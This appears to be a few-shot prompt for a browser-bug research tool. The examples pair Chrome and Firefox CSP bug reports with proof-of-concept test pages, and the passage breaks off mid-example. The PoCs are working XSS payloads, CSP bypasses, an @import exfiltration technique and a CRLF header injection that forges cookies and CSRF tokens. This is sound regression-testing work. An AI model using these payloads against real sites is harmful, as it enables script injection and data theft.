[
    {
        "role": "system",
        "content": [
            {
                "type": "text",
                "text": "{\"Role\": \"You are an expert web developer specializing in browser bug research and lifecycle analysis. Your task is to analyze bug reports with accompanying proof-of-concept (PoC) code and generate structured test cases to verify reproducibility.\", \"Context\": \"Context & File Structure:\\nEach test is an experiment for a bug_id organized as follows:\\nbug_id/\\n|-- url_queue.txt (optional)\\n|-- [domain1]/\\n|   |-- [page1]/\\n|   |   |-- index.html (or index.js)\\n|   |-- [page2]/\\n|       |-- index.html\\n|       |-- headers.json (optional)\\n|-- [domain2]/\\n    |-- ...\\n\\nAllowed domains:\\n* leak.test, a.test, sub.a.test, sub.sub.a.test, b.test, sub.b.test, adition.com\\nImportant: Use only these domains. No others allowed.\\n\\nPages:\\n* A domain can have multiple page folders (e.g., main, helper, worker).\\n* Each page must contain exactly one file: either index.html or index.js. No other filenames allowed.\\n\\nWeb Access:\\nFiles are accessed via:\\nhttps://[domain]/[page]\\nExample: a.test/main/index.html \\u2192 https://a.test/main\\n\\nHeaders (headers.json):\\nOptional. If present, must be a non-empty JSON array of key-value objects:\\n[\\n  {\\\"key\\\": \\\"Header-Name\\\", \\\"value\\\": \\\"Header-Value\\\"}\\n]\\n\\nNavigation (url_queue.txt):\\n* Required if navigation is not triggered by the browser itself.\\n* Contains one URL per line, in visit order.\\n* If absent, default flow:\\n    1. Load main page\\n    2. Navigate to: https://[domain]/report/?bughog_sanity_check=OK\", \"Goal\": \"You will be shown examples of bug reports and their test solutions.\\nStudy these examples and then generate a new test case for a previously unseen bug report, following the structure and rules above.\", \"Examples\": [{\"BugReport\": \"UserAgent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36\\n\\nSteps to reproduce the problem:\\nAs stated in https://github.com/w3c/webappsec-csp/issues/98 ; Chromium contains a protection against nonce stealing prevention, with detecting \\\"<script\\\" or \\\"<style\\\" in attribute name or value.\\n\\nThe prevention could be bypassed by duplicate attribute's name, for example:\\n\\n<!-- the following will not execute -->\\n<meta http-equiv=Content-Security-Policy\\n      content=\\\"script-src 'nonce-abcd'\\\">\\n<script src=data:,alert(1) nonce=\\\"abcd\\\" >\\n</script>\\n\\n<!-- the following will execute -->\\n<meta http-equiv=Content-Security-Policy\\n      content=\\\"script-src 'nonce-abcd'\\\">\\n<script src=data:,alert(1) x=\\\"\\\" x=\\\"<script\\\" nonce=\\\"abcd\\\" >\\n</script>\\n\\nPlease note that the issue has already been discussed in public:\\n- https://twitter.com/SecurityMB/status/883641714296193024\\n- https://jsbin.com/kayesofuto/edit?html,output\\n\\nWhat is the expected behavior?\\n\\nWhat went wrong?\\nThe prevention should detect \\\"<script\\\" string even if it is within a duplicated attribute.\\n\\nDid this work before? N/A\\n\\nChrome version: 59.0.3071.115  Channel: stable\\nOS Version: OS X 10.12.5\\nFlash Version:\", \"TestSolution\": {\"c740615\": {\"url_queue.txt\": \"https://leak.test/CSP/c740615/main\\nhttps://a.test/report/?leak=baseline\\n\", \"leak.test\": {\"main\": {\"index.html\": \"<head>\\n  <meta\\n    http-equiv=\\\"Content-Security-Policy\\\"\\n    content=\\\"script-src 'nonce-abcd'\\\"\\n  />\\n</head>\\n<body>\\n  <img id=\\\"123\\\" />\\n  <script\\n    src=\\\"data:,document.getElementById('123').src='https://a.test/report/?leak=c740615'\\\"\\n    x=\\\"\\\"\\n    x=\\\"<script\\\"\\n    nonce=\\\"abcd\\\"\\n  ></script>\\n</body>\\n\"}}}}}, {\"BugReport\": \"UserAgent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.79 Safari/537.36\\n\\nSteps to reproduce the problem:\\n1. Go to https://test.shhnjk.com/simple.html\\n2. data URL navigated by cross-origin inherited parent's CSP\\n\\nWhat is the expected behavior?\\nCSP does not inherit to cross-origin navigated data URL.\\n\\nWhat went wrong?\\nChrome always inherits CSP to data URL, whether it was navigated by same-origin page or cross-origin page. Thus allowing cross-origin page to gain information of CSP by navigating data URL which contains check of various CSP directives (PoC checks img-src and style-src).\\n\\nPoC shows that image request was block by parent's CSP but stylesheet was allowed. This data can be used to determine parent's website (by CSP fingerprint) and/or weakness of parent's CSP.\\n\\nDid this work before? N/A\\n\\nChrome version: 61.0.3163.79  Channel: n/a\\nOS Version: OS X 10.12.6\\nFlash Version:\\n\\nWhy Chrome started blocking server side redirect to data URL even inside iframe (see second iframe)?\", \"TestSolution\": {\"c767635\": {\"url_queue.txt\": \"https://leak.test/CSP/c767635/main\\nhttps://a.test/report/?leak=baseline\\n\", \"a.test\": {\"helper\": {\"index.html\": \"<script>\\n  location.replace(\\n    \\\"data:text/html;base64,PGlmcmFtZSBpZD0nMTIzJz48L2lmcmFtZT48aW1nIHNyYz0naHR0cHM6Ly9hLnRlc3QvcmVzb3VyY2VzL2N1c3RvbS82MDB4NDAwLnBuZycgb25sb2FkPSdkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiMTIzIikuc3JjPSJodHRwczovL2EudGVzdC9yZXBvcnQvP2xlYWs9bm90LWM3Njc2MzUiJz4=\\\"\\n  );\\n  /* Original base64 string:\\n    <iframe id='123'></iframe><img src='https://a.test/resources/CSP/600x400.png' onload='document.getElementById(\\\"123\\\").src=\\\"https://a.test/report/?leak=not-c767635\\\"'>\\n    */\\n</script>\\n\"}}, \"leak.test\": {\"main\": {\"index.html\": \"<html>\\n  <head>\\n    <meta http-equiv=\\\"Content-Security-Policy\\\" content=\\\"img-src 'self';\\\" />\\n  </head>\\n  <body>\\n    <iframe\\n      src=\\\"https://a.test/CSP/c767635/helper\\\"\\n      width=\\\"500px\\\"\\n      height=\\\"500px\\\"\\n    ></iframe>\\n  </body>\\n</html>\\n\"}}}}}, {\"BugReport\": \"Firefox's CSP implementation blocks dynamically created script tags (scripts created via document.createElement) with a valid nonce if the URL redirects.\\nSince the created script has a valid nonce it should execute (script gets executed in Chrome).\\nBecause of this bug, sites setting a nonce-based CSP (without strict-dynamic) randomly break in Firefox if some of their scripts are behind redirects.\\n\\nCode to reproduce in Firefox:\\n<!DOCTYPE html>\\n<html>\\n<head>\\n  <meta http-equiv=\\\"Content-Security-Policy\\\" content=\\\"script-src 'nonce-abcd1234'\\\">\\n</head>\\n<body>\\n  <script nonce='abcd1234'>\\n    var s = document.createElement('script');\\n    s.setAttribute('nonce', 'abcd1234');\\n    s.src = 'https://goo.gl/jEH8zk';  // 301 redirect.\\n    document.head.appendChild(s);     // Blocked by CSP in FF because of redirect.\\n  </script>\\n</body>\\n</html>\\n\\n\\nPreview\\nhttps://gist.github.com/lweichselbaum/9c8e32c592889ffc2f103fce9d45eaea\\n\\nhttp://gist-preview.herokuapp.com/preview?gist_url=https%3A%2F%2Fgist.githubusercontent.com%2Flweichselbaum%2F9c8e32c592889ffc2f103fce9d45eaea%2Fraw%2F505ed8c472a805c70cd05059206dd5f91c9a06ce%2FFF_CSP_BUG.html\", \"TestSolution\": {\"f1469150\": {\"url_queue.txt\": \"https://a.test/CSP/f1469150/main\\nhttps://a.test/report/?leak=baseline\\n\", \"a.test\": {\"main\": {\"index.html\": \"<script nonce=\\\"foobar\\\" src=\\\"https://a.test/CSP/f1469150/helper\\\"></script>\\n\", \"headers.json\": \"[\\n  {\\n    \\\"key\\\": \\\"Content-Security-Policy\\\",\\n    \\\"value\\\": \\\"script-src 'nonce-foobar' 'unsafe-inline' 'unsafe-eval'; report-uri /report/?leak=f1469150\\\"\\n  }\\n]\"}, \"helper\": {\"index.html\": \"\", \"headers.json\": \"[\\n  {\\n    \\\"key\\\": \\\"status\\\",\\n    \\\"value\\\": \\\"302\\\"\\n  },\\n  {\\n    \\\"key\\\": \\\"Location\\\",\\n    \\\"value\\\": \\\"https://leak.test/dummy\\\"\\n  }\\n]\"}}}}}, {\"BugReport\": \"UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36\\n\\nSteps to reproduce the problem:\\n1. Go to https://test.shhnjk.com/csp_open.php\\n2. Click go\\n\\nWhat is the expected behavior?\\nCSP violation report sent to test.shhnjk.com (CSP implementor)\\n\\nWhat went wrong?\\nIf <base> tag is specified to cross-origin (via local-scheme docuemnt or HTML injection) and CSP report-uri is relative URL, CSP violation report can be sent to cross-origin.\\n\\nThis could be used to steal cross-origin information in violation report since report might contain secret information like nonce, referrer, page URL, and so on.\\n\\nDid this work before? N/A\\n\\nChrome version: 62.0.3202.62  Channel: stable\\nOS Version: 10.0\\nFlash Version:\\n\\nI'm wondering this might further affect other report-uri features such as HPKP, XSS auditor, Expect-CT, and so on. Which I will test later today(I hope).\", \"TestSolution\": {\"c777350\": {\"url_queue.txt\": \"https://leak.test/CSP/c777350/main\\nhttps://a.test/report/?leak=baseline\\n\", \"leak.test\": {\"main\": {\"index.html\": \"<html>\\n  <head>\\n    <base href=\\\"https://a.test\\\" />\\n  </head>\\n  <body>\\n    <img src=\\\"https://a.test/image\\\" />\\n  </body>\\n</html>\\n\", \"headers.json\": \"[\\n  {\\n    \\\"key\\\": \\\"Content-Security-Policy\\\",\\n    \\\"value\\\": \\\"default-src 'self'; report-uri /report/?leak=c777350\\\"\\n  }\\n]\"}}}}}, {\"BugReport\": \"User Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.30 Safari/537.36\\n\\nSteps to reproduce:\\n\\n* Opened console\\n* Ticked preserve log\\n* Visited https://arturjanc.com/cgi-bin/ff63-nonce-redirect.py\\n\\n\\nActual results:\\n\\nAn exception gets logged and reported:\\nContent Security Policy: The page\\u2019s settings blocked the loading of a resource at https://payments.google.com/payments/v4/js/integrator.js (\\u201cscript-src\\u201d).\\n\\nThis is due to the fact that the script is dynamically loaded and redirects to \\\"https://www.gstatic.com/...\\\"\\n\\nThis looks like a special case of bug 1469150 which was marked as fixed. Apparently it is still there for dynamically loaded scripts.\\n\\nThis is not just a security issue for fingerprinting, but also a functional bug as it would break applications that use nonces correctly.\\n\\n\\nExpected results:\\n\\nNo violation reported.\", \"TestSolution\": {\"f1505412\": {\"url_queue.txt\": \"https://a.test/CSP/f1505412/main\\nhttps://a.test/report/?leak=baseline\\n\", \"a.test\": {\"main\": {\"index.html\": \"<script src=\\\"helper\\\" nonce=\\\"foobar\\\"></script>\", \"headers.json\": \"[{\\n    \\\"key\\\": \\\"Content-Security-Policy-Report-Only\\\",\\n    \\\"value\\\": \\\"script-src 'nonce-foobar'; report-uri /report/?leak=f1505412\\\"\\n}]\"}, \"helper\": {\"index.html\": \"\", \"headers.json\": \"[\\n    {\\n        \\\"key\\\": \\\"status\\\",\\n        \\\"value\\\": \\\"302\\\"\\n    },\\n    {\\n        \\\"key\\\": \\\"Location\\\",\\n        \\\"value\\\": \\\"https://leak.test/dummy\\\"\\n    }\\n]\"}}}}}, {\"BugReport\": \"UserAgent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36\\n\\nSteps to reproduce the problem:\\n1. Go to https://test.shhnjk.com/blobCSP.html\\n\\nWhat is the expected behavior?\\nScript is blocked by CSP \\\"script-src 'nonce-test'\\\" (Firefox does).\\n\\nWhat went wrong?\\nCSP is bypassed. Note that if the same blob URL is set to iframe or opened to new window, that's blocked correctly.\\n\\nSource:\\n<meta http-equiv=\\\"content-security-policy\\\" content=\\\"script-src 'nonce-test'\\\">\\n<script nonce=\\\"test\\\">\\nvar attackerControlledString = \\\"<script>alert(document.domain)<\\\\/script>\\\";\\nvar blob = new Blob([attackerControlledString], {type : 'text/html'});\\nvar url = URL.createObjectURL(blob);\\nlocation.href=url;\\n</script>\\n\\nDid this work before? N/A\\n\\nChrome version: 63.0.3239.132  Channel: stable\\nOS Version: OS X 10.13.2\\nFlash Version:\", \"TestSolution\": {\"c799747\": {\"url_queue.txt\": \"https://leak.test/CSP/c799747/main\\nhttps://a.test/report/?leak=baseline\\n\", \"leak.test\": {\"main\": {\"index.html\": \"<script nonce=\\\"test\\\">\\n  var attackerControlledString =\\n    \\\"<script src=https://a.test/report/?leak=c799747><\\\\/script>\\\";\\n  var blob = new Blob([attackerControlledString], { type: \\\"text/html\\\" });\\n  var url = URL.createObjectURL(blob);\\n  location.href = url;\\n</script>\\n\", \"headers.json\": \"[\\n    {\\n        \\\"key\\\": \\\"Content-Security-Policy\\\",\\n        \\\"value\\\": \\\"default-src 'none'; script-src 'unsafe-inline'\\\"\\n    }\\n]\"}}}}}, {\"BugReport\": \"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0\\nSteps to reproduce:\\nNavigate to https://l0.cm/fx_csp_violation_leak.html . This page has the following CSP and CSP violation event listener:\\n<meta http-equiv=\\\"Content-Security-Policy\\\" content=\\\"default-src 'self' 'unsafe-inline' vulnerabledoma.in\\\">\\ndocument.addEventListener('securitypolicyviolation', e => {\\n        console.dir(e);\\n        alert(e.blockedURI);\\n    });\\nIn addition, there are three buttons to embed other origin's pages into an iframe. These buttons are for testing the following cases.\\nTEST 1: Navigate to domain not allowed by CSP via 302 redirect\\nTEST 2: Navigate to domain not allowed by CSP via JavaScript\\nTEST 3: Navigate to domain not allowed by CSP via link\\nClick on the \\\"TEST 1\\\" button. \\\"https://vulnerabledoma.in/fx_csp_violation_leak_302.php\\\" is popped up. (= Safe. I think this behavior comes from a fix of bug 1069762 )\\nClick on the \\\"TEST 2\\\" button. \\\"https://www.vulnerabledoma.in/path?query\\\" is popped up. (= leak of redirect URL )\\nClick on the \\\"TEST 3\\\" button and then click on the displayed link. \\\"https://www.vulnerabledoma.in/path?query\\\" is popped up. (= leak of redirect URL )\\nFor your information, also the behavior of \\\"TEST 1\\\" is different from other browsers. Other browsers return \\\"https://www.vulnerabledoma.in\\\".\\nActual results:\\nThe CSP violation event object ( and CSP violation report ) contains the full redirect URL if the violation happens via a client-side navigation.\\nExpected results:\\nThe CSP violation event object ( and CSP violation report ) should not contain the full redirect URL in the case of navigation started from a client-side code also. This is because the redirect URL might have sensitive information.\", \"TestSolution\": {\"f1542194\": {\"a.test\": {\"main\": {\"index.html\": \"<iframe id=\\\"iframe\\\" src=\\\"helper\\\"></iframe>\\n\\n<script>\\n  document.addEventListener(\\\"securitypolicyviolation\\\", function (e) {\\n    console.dir(e);\\n    alert(e.blockedURI);\\n    if (e.blockedURI.indexOf(\\\"f1542194\\\") > -1) {\\n      document.getElementById(\\\"iframe\\\").src =\\n        \\\"https://a.test/report/?leak=f1542194\\\";\\n    }\\n  });\\n</script>\\n\", \"headers.json\": \"[\\n    {\\n        \\\"key\\\": \\\"Content-Security-Policy\\\",\\n        \\\"value\\\": \\\"default-src 'self' 'unsafe-inline'\\\"\\n    }\\n]\"}, \"helper\": {\"index.html\": \"<script>\\n  document.location.href = \\\"https://leak.test/CSP/f1542194/helper2\\\";\\n</script>\\n\"}}, \"leak.test\": {\"helper2\": {\"index.html\": \"Nothing to see here\"}}}}}, {\"BugReport\": \"UserAgent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36\\n\\nSteps to reproduce the problem:\\n<?php\\nheader(\\\"Content-Security-Policy: object-src 'none'\\\");\\n?>\\n<object data=\\\"http://www.w3school.com.cn/i/eg_tulip.jpg\\\"></object>\\n\\nWhat is the expected behavior?\\n\\nWhat went wrong?\\nWhen CSP set `object-src 'none'`, Chrome let the image in object tag show while Firefox block it\\n\\nDid this work before? N/A\\n\\nChrome version: 64.0.3282.140  Channel: stable\\nOS Version: OS X 10.13.3\\nFlash Version: Shockwave Flash 28.0 r0\", \"TestSolution\": {\"c811691\": {\"url_queue.txt\": \"https://leak.test/CSP/c811691/main\\nhttps://a.test/report/?leak=baseline\\n\", \"leak.test\": {\"main\": {\"index.html\": \"<object data=\\\"https://a.test/report/?leak=c811691\\\" type=\\\"image/jpeg\\\"></object>\\n\", \"headers.json\": \"[{\\n\\\"key\\\": \\\"Content-Security-Policy\\\",\\n\\\"value\\\": \\\"default-src 'none'; object-src 'none'\\\"\\n}]\"}}}}}, {\"BugReport\": \"See the attached test case. Edge and Chrome block the script from executing but Firefox executes it.\\nWith attachment: a.html\\n<!DOCTYPE html>\\n<html>\\n<head>\\n    <meta http-equiv=\\\"Content-Security-Policy\\\" content=\\\"default-src 'unsafe-inline'\\\">\\n<template id=\\\"a\\\">\\n    <script src=\\\"page.js\\\"></script>\\n</template>\\n</head>\\n<body>\\n<script>\\n    var temp = document.getElementsByTagName(\\\"template\\\")[0];\\n  var clon = temp.content.cloneNode(true);\\n  document.body.appendChild(clon);\\n</script>\\n</body>\\n</html>\\n\\nWith attachment: page.js\\n<html><head><meta name=\\\"color-scheme\\\" content=\\\"light dark\\\"></head><body><pre style=\\\"word-wrap: break-word; white-space: pre-wrap;\\\">alert(\\\"hello\\\");\\n</pre></body></html>\", \"TestSolution\": {\"f1548385\": {\"url_queue.txt\": \"https://a.test/CSP/f1548385/main\\nhttps://a.test/report/?leak=baseline\\n\", \"a.test\": {\"main\": {\"index.html\": \"<!DOCTYPE html>\\n<html>\\n<head>\\n    <meta http-equiv=\\\"Content-Security-Policy\\\" content=\\\"default-src 'unsafe-inline'\\\">\\n    <template id=\\\"a\\\">\\n        <script src=\\\"helper\\\"></script>\\n    </template>\\n</head>\\n<body>\\n<script>\\n    var temp = document.getElementsByTagName(\\\"template\\\")[0];\\n    var clon = temp.content.cloneNode(true);\\n    document.body.appendChild(clon);\\n</script>\\n</body>\\n</html>\"}, \"helper\": {\"index.js\": \"document.location.href = \\\"https://a.test/report/?leak=f1548385\\\";\\n\"}}}}}, {\"BugReport\": \"VULNERABILITY DETAILS\\nUsing csp attribute in <iframe> element, an attacker might set arbitrary http headers, using \\\"\\\\r\\\\n\\\" characters. The most obvious scenario of attack is to add a \\\"x-csrf-token\\\" header to bypass header-based CSRF protection.\\nInterestingly, though, it seems that arbitrary headers might be set, including Host, Content-type or User-Agent.\\nVERSION\\nChrome Version: 66.0.3359.181 stable\\nOperating System: macOS Sierra 10.12.6 (16G1314)\\nREPRODUCTION CASE\\nOn http://bntk.pl/headers.php there is a simple page that just returns all http request headers that the server saw. Please note that the page responds with Allow-CSP-From: \\\\* header, so that it can be easily seen what headers were sent.\\nBelow is a code that sets five headers: Host, X-Csrf-Token, Cookie, User-Agent and Content-Type.\\n<!doctype html><meta charset=utf-8>.\\n<script> const ifr = document.createElement('iframe'); ifr.src = 'http://bntk.pl/headers.php?'+Math.random(); ifr.height = '600px'; const headers = [ 'X-CSRF-TOKEN: 0123456789abcdef', 'Host: changed-host.bntk.pl', 'Cookie: aaaaa', 'User-Agent: Whatever', 'Content-type: application/json', ] ifr.csp = 'script-src\\\\r\\\\n' + headers.join('\\\\r\\\\n'); document.body.appendChild(ifr); </script>\\nThe output should be similar to:\\narray(11) {\\n[\\\"Host\\\"]=>\\nstring(20) \\\"changed-host.bntk.pl\\\"\\n[\\\"Connection\\\"]=>\\nstring(10) \\\"keep-alive\\\"\\n[\\\"Upgrade-Insecure-Requests\\\"]=>\\nstring(1) \\\"1\\\"\\n[\\\"Sec-Required-CSP\\\"]=>\\nstring(10) \\\"script-src\\\"\\n[\\\"X-CSRF-TOKEN\\\"]=>\\nstring(16) \\\"0123456789abcdef\\\"\\n[\\\"Cookie\\\"]=>\\nstring(5) \\\"aaaaa\\\"\\n[\\\"User-Agent\\\"]=>\\nstring(8) \\\"Whatever\\\"\\n[\\\"Content-type\\\"]=>\\nstring(16) \\\"application/json\\\"\\n[\\\"Accept\\\"]=>\\nstring(85) \\\"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\\\"\\n[\\\"Accept-Encoding\\\"]=>\\nstring(13) \\\"gzip, deflate\\\"\\n[\\\"Accept-Language\\\"]=>\\nstring(35) \\\"pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7\\\"\\n}\\nwhich proves that additional headers were set.\", \"TestSolution\": {\"c845961\": {\"url_queue.txt\": \"https://a.test/CSP/c845961/main\\nhttps://a.test/report/?leak=baseline\\n\", \"a.test\": {\"main\": {\"index.html\": \"<!doctype html><meta charset=utf-8>.\\n<script>\\n\\tconst ifr = document.createElement('iframe');\\n\\tifr.src = '/report/if/malicious-header?leak=c845961';\\n\\tifr.height = '600px';\\n\\tconst headers = [\\n        'X-CSRF-TOKEN: 0123456789abcdef',\\n\\t\\t'Cookie: malicious-cookie',\\n\\t\\t'User-Agent: Whatever',\\n        'malicious-header: hi'\\n\\t]\\n\\tifr.csp = 'script-src\\\\r\\\\n' + headers.join('\\\\r\\\\n');\\n\\n\\tdocument.body.appendChild(ifr);\\n</script>\"}}}}}, {\"BugReport\": \"environment:\\nwindows 10\\nFirefox 66.0.5 x64\\nXss is triggered when the victim opens csp.html.\\npoc:\\ncsp.html\\n<meta http-equiv=\\\"Content-Security-Policy\\\" content=\\\"script-src 'none'\\\">\\n<script>alert(location.href)</script>\\n<iframe src=./xs.html>\\nxs.html\\n<script>\\nparent.window.location =\\\"javascript:alert(location.href)\\\";\\n</script>\", \"TestSolution\": {\"f1550414\": {\"url_queue.txt\": \"https://a.test/CSP/f1550414/main\\nhttps://a.test/report/?leak=baseline\\n\", \"a.test\": {\"main\": {\"index.html\": \"<!--<script>alert(location.href)</script>-->\\n<iframe src=\\\"helper\\\">\", \"headers.json\": \"[\\n    {\\n        \\\"key\\\": \\\"Content-Security-Policy\\\",\\n        \\\"value\\\": \\\"script-src 'none'\\\"\\n    }\\n]\"}, \"helper\": {\"index.html\": \"<script>\\n  parent.window.location =\\n    \\\"javascript:document.location.href='https://a.test/report/?leak=f1550414'\\\";\\n</script>\\n\"}}}}}, {\"BugReport\": \"UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36\\n\\nSteps to reproduce the problem:\\n1. Go to https://vuln.shhnjk.com/iframer.php?url=https://test.shhnjk.com/blobCSP.html\\n2. Observe an alert\\n\\nWhat is the expected behavior?\\nalert is blocked by CSP\\n\\nWhat went wrong?\\nPatch of issues 799747 tries to see if there is any parent/opener where blob URL can inherit CSP from. Since they finds parent with no CSP, blob URL will happily inherit that and bypasses CSP.\\n\\nDid this work before? N/A\\n\\nChrome version: 69.0.3497.100  Channel: stable\\nOS Version: 10.0\\nFlash Version:\", \"TestSolution\": {\"c894228\": {\"url_queue.txt\": \"https://a.test/CSP/c894228/main\\nhttps://a.test/report/?leak=baseline\\n\", \"a.test\": {\"main\": {\"index.html\": \"<iframe src=\\\"https://leak.test/CSP/c894228/main\\\"></iframe>\\n\"}}, \"leak.test\": {\"main\": {\"index.html\": \"<script src=\\\"helper\\\">\\n\\n</script>\", \"headers.json\": \"[\\n    {\\n        \\\"key\\\": \\\"Content-Security-Policy\\\",\\n        \\\"value\\\": \\\"default-src 'none'; script-src leak.test\\\"\\n    }\\n]\"}, \"helper\": {\"index.html\": \"var attackerControlledString = \\\"<script>document.location='https://a.test/report/?leak=c894228'<\\\\/script>\\\";\\nvar blob = new Blob([attackerControlledString], {type : 'text/html'});\\nvar url = webkitURL.createObjectURL(blob);\\nlocation.href=url;\\n\"}}}}}, {\"BugReport\": \"When user is able to inject CSS in some page protected by CSP nonce, firefox won't block @import requests making possible to leak sensitive content data.\\nMozilla Developer Network documentation (https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/style-src\\n) says: \\\"You can use a nonce-source to only allow specific inline style blocks\\\"\\nSo it seems that page should block intead of load arbitrary styles, as chrome does.\\nPoC:\\nTo demonstrate this bug I wrote a web page that receives CSS from a parameter 'css' and insert it into a nonced style in page: http://abrasax.club/csp/css/?css=body{background-color:%20blue;}\\nthe CSP defined by this page is: Content-Security-Policy: default-src 'self'; style-src 'nonce-e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855'; img-src data: http: https:; font-src data: http https\\nWhen some user abuse include @import tag the external content is included without get blocked by firefox: http://abrasax.club/csp/css/?css=@import%20url(https://l4t.cc/exfil/a.css);\\nwhen the same url is displayed in chrome it gets blocked, even if the source content becomes from the same domain: http://abrasax.club/csp/css/?css=@import%20url(./b.css);\\nSo it becomes possible to abuse the load of @import exfiltrate leak page information, like tokens that didn't change in every request, small token's that reload for each request and for bigger tokens that reload for each refresh (using @import tehcnique: https://medium.com/@d0nut/better-exfiltration-via-html-injection-31c72a2dae8b or using font technique: https://twitter.com/terjanq/status/1180477124861407234)\\nI also sent 2 videos in attachments showing attack examples.\", \"TestSolution\": {\"f1605814\": {\"url_queue.txt\": \"https://leak.test/CSP/f1605814/main\\nhttps://a.test/report/?leak=baseline\\n\", \"leak.test\": {\"main\": {\"index.html\": \"<style nonce=\\\"1337\\\">\\n  @import url(https://a.test/report/?leak=f1605814);\\n</style>\\n\", \"headers.json\": \"[\\n    {\\n        \\\"key\\\": \\\"Content-Security-Policy\\\",\\n        \\\"value\\\": \\\"default-src 'self'; style-src 'nonce-1337'; img-src data: http: https:; font-src data: http https\\\"\\n    }\\n]\"}}}}}, {\"BugReport\": \"VULNERABILITY DETAILS\\nCSP(Content-security-policy) vulnerabilities are not completely repaired in Chrome 70.0.3538.110 and can still be bypassed\\nVERSION\\nChrome Version: [70.0.3538.110] + [stable]\\nOperating System: [windows 10 professional]\\nREPRODUCTION CASE\\nExtract the files of htdocs.rar to an HTTP server(such as apache),csp.php is a demo page with XSS vulnerabilities.\\nAccessing csp.php links on HTTP servers using chrome browser,such as:\\nhttp://x.x.x.x/csp.php?inj=<script%20src=xss.js%20a=\\\"a\\\"%20a=\\\"\\nIt will pop up a dialog box containing the text of \\\"XSS\\\".\\nBy contrast,the following links will not pop up the dialog box:\\nhttp://x.x.x.x/csp.php?inj=<script%20src=xss.js%20a=\\\"\\nChrome says:\\\"Refused to load the script 'http://x.x.x.x/xss.js' because it violates the following Content Security Policy directive:...\\\"\\nYou can see that chrome intentionally fixes this vulnerability to better combat XSS vulnerabilities, but unfortunately, two same parameters bypass this fix and make the vulnerabilities recur.\\nCREDIT INFORMATION\\nReporter credit: [Cusas @ L.O.Team]\", \"TestSolution\": {\"c908207\": {\"a.test\": {\"main\": {\"index.html\": \"<!DOCTYPE html>\\n<html>\\n<body>\\n\\n\\n<script src=helper a=\\\"a\\\" a=\\\"\\n\\n<script type=\\\"text/javascript\\\" nonce=random>\\n//\\n</script>\\n\\n</body>\\n</html>\", \"headers.json\": \"[{\\n    \\\"key\\\": \\\"Content-Security-Policy\\\",\\n    \\\"value\\\": \\\"script-src 'nonce-random' 'strict-dynamic';\\\"\\n}]\"}, \"helper\": {\"index.js\": \"document.location.href = \\\"https://a.test/report/?leak=c908207\\\";\\n\"}}}}}, {\"BugReport\": \"Commonly, websites use a response header like X-Frame-Options: DENY or CSP's frame-ancestors directive to disallow being embedded across origins.\\nIt seems that this restriction can be easily bypassed with embeds like <object data=url> or <embed src=url>.\\nSTR:\\nFind a website that disallows framing (i.e., X-Frame-Options set to DENY or SAMEORIGIN or has a CSP directive that does the same). This example will use https://accounts.google.com\\nEmbed on a different origin using embed or object elements. Example:\\ndata:text/html,embed:<embed src=\\\"https://accounts.google.com\\\"><hr>object:<object data=\\\"https://accounts.google.com\\\">\\nObserve how both frames are loading successfully.\\nExpected results: Frames should not load and show an error page.\", \"TestSolution\": {\"f1644076\": {\"url_queue.txt\": \"https://leak.test/CSP/f1644076/main\\nhttps://a.test/report/?leak=baseline\\n\", \"a.test\": {\"helper\": {\"index.html\": \"Redirect\\n<script>\\n  document.location.href = \\\"https://a.test/report/?leak=f1644076\\\";\\n</script>\\n\", \"headers.json\": \"[\\n    {\\n        \\\"key\\\": \\\"Content-Security-Policy\\\",\\n        \\\"value\\\": \\\"frame-ancestors 'none'\\\"\\n    }\\n]\"}}, \"leak.test\": {\"main\": {\"index.html\": \"<embed src=\\\"https://a.test/CSP/f1644076/helper\\\" />\\n\"}}}}}, {\"BugReport\": \"VULNERABILITY DETAILS\\nA parent document with a CSP that does not allow unsafe inline scripts can still execute JavaScript URLs in inline iframes if using the iframe content window's location.href to navigate.\\nThis occurs because asynchronous javascript: URL navigations (such as those from location.href) do not check the parent document's CSP in the posted task- only the document of the embedded frame's CSP is checked (see ScriptController::ExecuteScriptIfJavascriptURL). Setting an iframe's document with the src attribute blocks this as expected due to the extra synchronous checks in HTMLFrameElementBase::OpenURL.\\nI discovered this when working on https://crbug.com/chromium/638435, as it caused the Web Platform Test content-security-policy/navigation/to-javascript-url-script-src.html to fail when I was migrating iframe.src navigations to be async (case \\\"<iframe src='...'> with 'unsafe-inline' navigated to 'javascript:' blocked in this document\\\").\\nMore details on expected behaviour can be found here: https://github.com/w3c/webappsec-csp/issues/127\\nPlease let me know if you need any more info!\\nVERSION\\nChrome Versions:\\nTrunk (r612476)\\n70.0.3538.110 + stable\\nOperating System: Ubuntu 18.04.1 LTS\\nREPRODUCTION CASE\\nLoad the attached file test.html in Chrome, with both test.html and test_frame.html hosted on an HTTP server. Observe that the iframe whose source is set with location.href erroneously executes the JavaScript URL, and prints \\\"FAIL (JS URL executed)\\\". The iframe whose source is set with the src attribute blocks this as expected.\\nThis test passes for both cases in Firefox.\\nWith attachment: test.html\\n<!DOCTYPE html>\\n<meta http-equiv=\\\"Content-Security-Policy\\\" content=\\\"default-src 'self'; script-src 'nonce-whitelist'\\\">\\n\\n<body>\\n  Setting location with <code>iframe.contentWindow.location.href</code><br/>\\n  